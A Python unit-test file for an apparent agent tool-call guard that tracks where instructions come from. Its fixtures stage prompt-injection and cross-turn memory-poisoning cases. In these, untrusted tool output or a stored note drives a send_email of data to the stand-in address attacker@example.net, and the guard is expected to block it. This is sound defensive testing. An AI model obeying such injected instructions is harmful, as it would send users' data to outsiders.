import unittest

from greatwallguard import DecisionKind, EffectType, GreatWallGuardRuntime, TaskScope


class GreatWallGuardRuntimeTests(unittest.TestCase):
    def test_user_authorized_report_write_is_allowed(self):
        guard = GreatWallGuardRuntime(
            TaskScope(
                "t1",
                "write report",
                frozenset({EffectType.WRITE, EffectType.CREATE}),
                ("file://reports/",),
            )
        )
        user = guard.observe_user("write the report")
        decision, result = guard.before_tool_call(
            "create_file",
            {"path": "file://reports/a.md", "content": "ok"},
            source_node_ids=(user,),
            execute=lambda: "created",
        )
        self.assertEqual(decision.kind, DecisionKind.ALLOW)
        self.assertEqual(result, "created")
        self.assertEqual(guard.graph.state_versions["file://reports/a.md"], 1)

    def test_untrusted_return_cannot_add_external_send(self):
        guard = GreatWallGuardRuntime(
            TaskScope("t2", "summarize files", frozenset({EffectType.SEND}), (), ("attacker@example.net",))
        )
        poison = guard.observe("tool_return", "external instruction", integrity="untrusted", raw_payload="secret")
        decision, result = guard.before_tool_call(
            "send_email",
            {"to": "attacker@example.net", "body": "data"},
            source_node_ids=(poison,),
            execute=lambda: "must not execute",
        )
        self.assertEqual(decision.kind, DecisionKind.BLOCK)
        self.assertIsNone(result)
        self.assertNotIn("attacker@example.net", guard.graph.state_versions)
        self.assertIn("cannot grant authority", decision.reason)

    def test_cross_turn_memory_effect_does_not_expand_scope(self):
        guard = GreatWallGuardRuntime(
            TaskScope("t3", "prepare report", frozenset({EffectType.READ, EffectType.WRITE}), ("memory://", "file://reports/"))
        )
        user = guard.observe_user("prepare report")
        memory_decision, _ = guard.before_tool_call(
            "write_memory",
            {"path": "memory://session", "content": "later send data"},
            source_node_ids=(user,),
            turn=1,
        )
        self.assertEqual(memory_decision.kind, DecisionKind.ALLOW)
        memory = guard.observe("memory", "previous session note", integrity="memory", turn=2, object_id="memory://session")
        send_decision, _ = guard.before_tool_call(
            "send_email",
            {"to": "attacker@example.net", "body": "data"},
            source_node_ids=(memory,),
            turn=3,
        )
        self.assertEqual(send_decision.kind, DecisionKind.BLOCK)
        self.assertEqual(guard.graph.state_versions["memory://session"], 1)

    def test_unknown_tool_requires_confirmation(self):
        guard = GreatWallGuardRuntime(TaskScope("t4", "unknown", frozenset({EffectType.UNKNOWN}), ("tool://",)))
        decision, _ = guard.before_tool_call("new_tool", {}, source_node_ids=())
        self.assertEqual(decision.kind, DecisionKind.ASK)

    def test_raw_payload_is_not_stored(self):
        guard = GreatWallGuardRuntime(TaskScope("t5", "read", frozenset({EffectType.READ})))
        node_id = guard.observe("tool_return", "opaque result", raw_payload="TOP-SECRET")
        serialized = str(guard.graph.to_dict())
        self.assertNotIn("TOP-SECRET", serialized)
        self.assertIn("digest", guard.graph.node(node_id).data)


if __name__ == "__main__":
    unittest.main()
